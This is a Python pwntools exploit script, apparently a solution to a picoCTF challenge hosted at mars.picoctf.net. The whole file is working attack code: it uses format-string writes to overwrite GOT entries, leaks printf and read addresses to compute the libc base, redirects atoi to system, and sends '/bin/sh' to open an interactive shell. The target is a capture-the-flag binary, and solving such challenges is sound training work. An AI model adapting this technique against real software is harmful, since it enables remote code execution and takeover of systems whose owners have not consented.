#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
# libc = ELF("./libc6_2.37-0ubuntu2_amd64.so")		# Download to test this in LOCAL
libc = ELF("libc6_2.31-0ubuntu9.1_amd64.so")
context.binary = exe


START_OFFSET = 10


def conn():
	global r

	if args.LOCAL:
		r = process([exe.path])
		if args.PLT_DEBUG:
			gdb.attach(r)
	else:
		r = remote("mars.picoctf.net", 31929)

	return r


def leak_libc_and_loop():
	printf_got  = exe.got['printf']
	read_got    = exe.got['read']
	pow_got     = exe.got['pow']
	main_func   = exe.symbols['main']

	# len("Calculating for A: ") == 19 and len("1___") == 4; so 19 + 4 = 23
	num_first_write	 = (main_func & 0xFFFF) - 23
	num_second_write = (((main_func >> 16) | 0xFFFFFF00) - (main_func & 0xFFFF)) & 0xFF		# Since we will write the first byte, we mask it with 0xFF

	payload =  f'1___%{num_first_write}c%{START_OFFSET + 4}$lln'.encode('ascii')		# len == 17
	payload += f'%{num_second_write}c%{START_OFFSET + 5}$hhn_____'.encode('ascii')		# len == 15
	payload += p64(pow_got) + p64(pow_got + 2) + p64(printf_got) + p64(read_got)
	r.sendlineafter(b'A: ', payload)

	# Print the addresses on another format string just to make things a bit more cleaner
	payload = f'1______%{START_OFFSET + 6}$s__%{START_OFFSET + 7}$s'.encode('ascii')
	r.sendlineafter(b'B: ', payload)

	leaks = r.recvline().split(b'and B: 1______')[1][:-1].split(b'__')		# Get the leaks ("[:-1]" for the newline which somehow is present in the string)
	leaks = [int.from_bytes(x, 'little') for x in leaks]
	log.info(f'Leaked addresses: {[hex(x) for x in leaks]}')

	libc.address = leaks[0] - libc.symbols['printf']	# First address is for the 'printf'
	assert(libc.address & 0xFFF == 0)
	log.info(f'LIBC base address calculated is: {hex(libc.address)}')


def atoi_to_system():
	atoi_got = exe.got['atoi']
	system	 = libc.symbols['system']

	# len("Calculating for A: ") == 19 and len("1___") == 4; so 19 + 4 = 23
	num_first_write  = (system & 0xFFFF) - 23
	num_second_write = ((system >> 16) - (system & 0xFFFF)) & 0xFFFF	# Subtract the first 2 bytes written
	num_third_write  = ((system >> 32) | 0xFFFF0000) - ((system >> 16) & 0xFFFF) & 0xFFFF	# Extends the number with OR bitwise for the subtraction (carry problem)

	payload =  f'1___%{num_first_write}c%{START_OFFSET + 6}$lln'.encode('ascii')
	payload += f'%{num_second_write}c%{START_OFFSET + 7}$hn'.encode('ascii')
	payload += f'%{num_third_write}c%{START_OFFSET + 8}$hn____'.encode('ascii')

	payload += p64(atoi_got) + p64(atoi_got + 2) + p64(atoi_got + 4)
	r.sendlineafter(b'A: ', payload)

	payload = b'2BBBBBBB'	# Dummy string
	r.sendlineafter(b'B: ', payload)


def get_shell():
	payload = b'/bin/sh'
	r.sendlineafter(b'A: ', payload)

	payload = b'u_g0t_PwN3d_b4by'		# Dummy input
	r.sendlineafter(b'B: ', payload)

	r.interactive()


def main():
	r = conn()

	leak_libc_and_loop()
	atoi_to_system()
	get_shell()


if __name__ == "__main__":
	main()
